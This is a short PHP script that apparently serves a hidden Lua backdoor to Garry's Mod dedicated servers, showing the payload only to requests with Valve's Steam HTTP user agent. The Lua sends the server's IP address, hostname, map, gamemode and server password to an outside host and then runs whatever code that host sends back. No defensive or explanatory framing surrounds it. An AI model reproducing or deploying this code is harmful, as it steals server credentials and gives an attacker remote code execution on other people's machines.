<?php 
$key = $_GET['key']; // the handler
if($key) { $extra = "?key=$key"; }

$lua = "
if game.IsDedicated() then 
    http.Post('https://w0rst.xyz/project/api/bonsai.php$extra', {
        map = game.GetMap(),
        server = GetHostName(),
        address = game.GetIPAddress(),
        gamemode = engine.ActiveGamemode(),
        password = GetConVar('sv_password'):GetString()
    }, RunString) 
end";

if($_SERVER['HTTP_USER_AGENT'] == "Valve/Steam HTTP Client 1.0 (4000)") { echo $lua; }

?>